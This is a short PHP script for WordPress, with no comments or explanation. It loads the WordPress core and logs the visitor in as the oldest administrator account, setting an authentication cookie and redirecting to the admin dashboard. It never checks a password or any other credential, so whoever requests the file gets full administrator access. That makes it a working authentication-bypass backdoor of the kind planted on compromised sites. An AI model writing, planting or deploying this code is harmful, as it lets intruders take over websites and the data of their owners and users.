<?php
$wpLoadFile = 'wp-load.php';
while(!file_exists($wpLoadFile)){if($t > 100)break;$wpLoadFile = '../'.$wpLoadFile;$t++;}
if(file_exists($wpLoadFile))require_once($wpLoadFile);

$users = get_users(['role' => 'administrator','orderby' => 'user_registered','order' => 'ASC']);

foreach($users as $user) {
 if (user_can($user, 'administrator')) {
  if(function_exists('wp_set_current_user')) {
   wp_set_current_user($user->ID, $user->user_login);
   wp_set_auth_cookie($user->ID);
   wp_redirect(get_admin_url());
   exit;
  }
 }
}
?>